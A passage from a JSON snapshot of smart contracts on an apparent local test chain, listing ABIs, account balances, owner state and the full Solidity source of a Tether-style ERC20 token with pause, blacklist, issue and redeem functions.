false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0xD833215cBcc3f914bD1C9ece3EE7BF8B14f841bb": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99873536340000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "paused": false,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "SafeMath",\n      "address": "0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7",\n      "abi": [],\n      "functions": [],\n      "events": [],\n      "accounts_balances": {\n        "0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99873536340000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "TetherToken",\n      "address": "0xe982E462b094850F12AF94d21D470e21bE9D0E9C",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "name",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "name": "deprecate",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "approve",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "deprecated",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "name": "addBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transferFrom",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "upgradedAddress",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "balances",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "decimals",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": 